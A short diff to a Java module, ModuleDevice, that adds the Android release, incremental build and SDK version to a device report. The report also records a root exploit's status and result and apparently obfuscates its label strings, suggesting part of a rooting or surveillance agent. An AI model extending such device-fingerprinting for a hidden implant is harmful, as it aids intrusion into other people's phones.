@@ -192,7 +192,9 @@ public class ModuleDevice extends BaseInstantModule {
 
 		sb.append(M.e("Root Status: ") + Status.getExploitStatusString() + M.e(", Result: ") + Status.getExploitResultString() + "\n");
 		sb.append(M.e("OS Runtime: ") + (Root.isArtInUse()?M.e("ART"):M.e("Dalvik"))+ "\n");
-		sb.append(M.e("Runtime: ") + Build.BOARD + "\n");
+		sb.append(M.e("Release: ") + Build.VERSION.RELEASE + "\n");
+		sb.append(M.e("Incremental: ") + Build.VERSION.INCREMENTAL + "\n");
+		sb.append(M.e("Sdk: ") + Build.VERSION.SDK + "\n");
 		sb.append(M.e("Board: ") + Build.BOARD + "\n");
 		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
 		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
